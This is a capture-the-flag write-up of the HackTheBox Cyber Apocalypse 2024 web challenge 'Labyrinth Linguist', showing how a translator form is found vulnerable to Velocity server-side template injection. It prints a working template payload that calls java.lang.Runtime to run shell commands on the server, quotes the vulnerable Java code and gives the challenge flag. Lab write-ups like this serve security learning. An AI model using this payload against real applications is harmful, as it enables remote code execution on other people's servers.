---
name: Labyrinth Linguist (2024)
event: HackTheBox Cyber Apocalypse CTF 2024
category: Web
description: Writeup for Labyrinth Linguist (Web) - HackTheBox Cyber Apocalypse CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Labyrinth Linguist

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/-vhl8ixthO4/0.jpg)](https://www.youtube.com/watch?v=-vhl8ixthO4?t=586 "HackTheBox Cyber Apocalypse '24: Labyrinth Linguist (web)")

## Description

> You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.

## Solution

We can review source code but first let's check the site functionality. It's basic, we have a form field and a submit button and it says `Enter text to translate english to voxalith!`.

If we enter some text, it will send our data in a POST request, e.g. `text=hi` and display our text in a "fire" text font.

{% code overflow="wrap" %}
```html
<h2 class="fire">hi</h2>
```
{% endcode %}

The burp scanner detects several vulns, including `SSTI`, `XSS` and `Client-side desync`.

The XSS checks out, we can easily pop an alert but what is a vulnerability without impact? Let's stop wasting time with self-XSS and review the SSTI.

The advisory notes that the template engine appears to be `Velocity`. Here's the URL-decoded payload, which prints `v0oot695019a4423` to the screen.

{% code overflow="wrap" %}
```java
#set ($a=923*753) v0oot${a}a4423
```
{% endcode %}

Burp always complicates PoC's for some reason, here's a better visualisation.

{% code overflow="wrap" %}
```java
#set ($hack=420*23) ${hack}
```
{% endcode %}

When URL-encoded, it prints `9660`. So, we have confirmed the presence of server-side template injection. Next, we want to find some payloads that do more than basic mathematical calculations.

-   [Portswigger SSTI research](https://portswigger.net/research/server-side-template-injection)
-   [HackTricks Velocity SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#velocity-java)
-   [PayloadsAllTheThings Velocity SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java---velocity)
-   [Velocity SSTI blogpost](https://antgarsil.github.io/posts/velocity)
-   [Velocity user guide](https://velocity.apache.org/engine/1.7/user-guide.html)

None of the payloads I could find would work. I Tried `text=%23include("flag.txt")` and various directory traversals but it always always returned a 500 error; `unable to find resource`.

Eventually, I found a payload in a [gosecure SSTI workshop](https://gosecure.github.io/template-injection-workshop/#6) that worked.

{% code overflow="wrap" %}
```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('ls ../'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```
{% endcode %}

It was quite similar to the payloads in the resources listed earlier. The main difference is we didn't access the `$class` variable directly (instead accessing via a string).

Anyway, we URL-encode the payload list out the files in the directory. One is named `flag3b28509596.txt` so we can just update the payload to `cat` the flag.

Again, we solved the challenge without requiring access to server-side source code. Personally, I think this is a valuable exercise, especially if you want to improve your bug bounty skills since source code is typically unavailable. Actually, I did download the code and check it very quickly towards the beginning, e.g. it's nice to know there's a `flag.txt` that will be in the root directory.

{% code overflow="wrap" %}
```bash
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
```
{% endcode %}

I didn't study the source code though. If I did, I would of discovered the `Main.java` file imports `velocity` and inserts our unsanitised user input (`textString`) into the webpage, resulting in SSTI.

{% code overflow="wrap" %}
```java
template = readFileToString("/app/src/main/resources/templates/index.html", textString);
```
{% endcode %}

{% code overflow="wrap" %}
```java
StringReader reader = new StringReader(template);
org.apache.velocity.Template t = new org.apache.velocity.Template();
```
{% endcode %}

{% code overflow="wrap" %}
```java
t.setData(runtimeServices.parse(reader, "home"));
t.initDocument();
VelocityContext context = new VelocityContext();
context.put("name", "World");
StringWriter writer = new StringWriter();
t.merge(context, writer);
template = writer.toString();
```
{% endcode %}

Flag: `HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}`
